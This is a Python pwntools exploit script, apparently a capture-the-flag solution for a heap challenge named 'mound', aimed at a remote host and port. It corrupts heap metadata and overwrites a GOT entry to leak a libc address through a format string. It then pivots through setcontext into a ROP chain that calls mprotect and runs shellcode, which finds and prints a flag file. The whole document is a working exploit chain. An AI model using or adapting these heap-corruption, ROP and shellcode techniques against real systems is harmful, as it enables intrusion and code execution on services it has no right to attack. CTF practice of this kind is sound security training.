#!/usr/bin/env python3

from pwn import *

exe = ELF("./mound_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("193.57.159.27",41932)

def alloc(index, name):
    r.sendlineafter("> ", "1")
    r.sendafter(": ", name)
    r.sendlineafter(": ", str(index))

def free(index):
    r.sendlineafter("> ", "4")
    r.sendlineafter(": ", str(index))

def edit(index, data):
    r.sendlineafter("> ", "3")
    r.sendlineafter(": ", str(index))
    r.sendlineafter(": ", data)

def alloc_from_cache(index, size, data):
    r.sendlineafter("> ", "2")
    r.sendlineafter(": ", str(size))
    r.sendlineafter(": ", str(index))
    r.sendafter(": ", data)



def main():
    
    alloc(0, b"M"*0x24)
    alloc(1, b"M"*0x24)
    free(1)

    edit(0, b"N"*0x24)
    free(1)

    edit(0, b"A"*0x24)
    free(1)

    alloc_from_cache(2, 28, p64(0x00000beef0000010) + p64(0xdead0008008-0x10))
    alloc_from_cache(3, 28, p64(0x00000beef0000010) + p64(0x4E4E4E4E))
    alloc_from_cache(4, 28, p64(0x404180)*2)
    alloc_from_cache(5, 1000, p64(exe.got['strdup']) + p64(0x4042a0) + p64(0)*0xe + p64(0x400)*2 + b"\x00.\x00")

    edit(2, p64(exe.plt['printf']))
    alloc(10, "%43$p")
    leak = int(r.recv(14), 16)
    log.warn("libc leak @ 0x%x", leak)

    libc.address = leak - libc.sym['__libc_start_main'] - 243
    log.warn("libc base @ 0x%x", libc.address)
    
    edit(2, p64(libc.sym['setcontext']))
    
    rsp = 0x4042a0
    ret = 0x0000000000401016
    pop_rdi = 0x0000000000401e8b
    pop_rsi = libc.address + 0x0000000000027529
    pop_rdx_r12 = libc.address + 0x000000000011c371
    
    shellcode = asm(f"""
        //Trying to open the directory.
        mov rdi, {0x404221}
        mov r11, {libc.sym.opendir}
        call r11

        mov r15, rax

        // get the file names in the current directory.
        loop:
            mov r11, {libc.sym.readdir}
            mov rdi, r15

            call r11
            mov r12, rax

            // go to d_name element.
            add r12, 0x13

            // r13 is a pointer to the file name.
            mov r13, r12

            // if the file is 32 bytes long, and the extension is .txt
            // that will be our flag.
            
            add r12, 32
            mov al, byte ptr [r12]
            cmp al, 0x2e
            je osf

            jmp loop

    osf:
       mov rdi, -100
       mov rsi, r13
       xor edx, edx
       xor r10d, r10d
       mov rax, 0x101
       syscall

       mov rdi, 0x1
       mov rsi, rax
       xor edx, edx
       mov r10, 0x100
       mov rax, 0x28
       syscall
       jmp exit

    exit:
        mov rax, 0x3c
        mov rdi, 0x4d
        syscall 
    """)

    rop = p64(pop_rdi)
    rop += p64(0x0000000000404000)
    rop += p64(pop_rsi)
    rop += p64(0x1000)
    rop += p64(pop_rdx_r12)
    rop += p64(0x7)*2
    rop += p64(libc.sym['mprotect'])
    rop += p64(0x00000000004042e0+8)
    rop += shellcode
    
    edit(3, rop)
    
    payload = cyclic_metasploit(0xa0)
    payload += p64(rsp) #rsp
    payload += p64(ret) #rcx
    payload += b"M"*(0xe0 - len(payload))
    payload += p64(0x4040a0)

    pause()
    alloc(0, payload)

    r.interactive()


if __name__ == "__main__":
    main()
